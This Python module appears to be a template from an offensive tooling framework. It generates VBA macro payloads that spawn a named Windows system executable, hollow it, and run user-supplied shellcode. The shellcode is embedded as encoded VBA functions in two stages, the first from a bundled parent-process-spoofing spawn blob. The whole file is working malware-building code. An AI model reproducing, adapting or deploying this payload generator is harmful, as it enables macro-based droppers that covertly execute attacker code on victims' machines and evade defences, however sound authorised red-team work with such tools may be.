
from lib.interfaces.module_interface import ModuleInterface
from lib.handlers.generic import quotedstring
from lib.validators.files import isbasename, isreadable
from data.scripts.BinaryToVbaFunc import BinaryToVbaFunc
import os
import base64

class Template(ModuleInterface): #usename
    def __init__(self, templatePath, helpers):
        options = {}
        self.helpers = helpers
        self.encodings = { "0": "-", "6": "!" }
        options['binaryname'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "The executable on target to run and hollow. The EXE must be in system32/syswow64 (ex. rundll32.exe)",
            "validator": isbasename,
            "handler": quotedstring
        }
        options['shellcode'] = { #list of strings for expected options
            "value": None,
            "required": True,
            "description": "The shellcode file to embed and run inside hollowed target binary.",
            "validator": isreadable,
            "tab_complete": self.helpers.complete_path,
            "handler": None
        }
        super().__init__(templatePath, options)

    def preprocess(self):

        # Create the stage 2 shellcode which will run from within the spawned EXE
        stage2_path = self.options['shellcode']['value']
        stage2_shellcode = ""
        with open(stage2_path, "rb") as fPayload:
            stage2_shellcode = fPayload.read()
        stage2_shellcode_encoded = ""
        #stage2_shellcode_encoded = self.helpers.generate_base64(stage2_shellcode).decode('utf-8')
        stage2_shellcode_encoded = self.helpers.generate_base64(stage2_shellcode)
        self.options['getStage_2'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage2 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_2']['value'] = BinaryToVbaFunc(
            stage2_shellcode_encoded, 
            'getStage_2', 
            self.encodings
        )
        
        # Create the stage 1 shellcode which will spawn the EXE and hollow it 
        # Convert the shellcode into VBA functions
        stage1_path = os.path.join(
            self.helpers.getpayloaddir(), 
            "ppid_shellcode_spawn.bin"
        )
        stage1_shellcode = ""
        with open(stage1_path, 'rb') as fPayload:
            stage1_shellcode = fPayload.read()
        self.options['getStage_1'] = {
            "value": None,
            "required": True,
            "description": "the generated function which returns the stage1 payload buffer",
            "validator": None,
            "handler": None
        }
        self.options['getStage_1']['value'] = BinaryToVbaFunc(
            stage1_shellcode, 
            'getStage_1', 
            self.encodings
        )
    # end preprocess


    def postprocess(self):
        # Remove the generated shellcode functions from the options
        del self.options['getStage_1']
        del self.options['getStage_2']
        
    # end postprocess
        

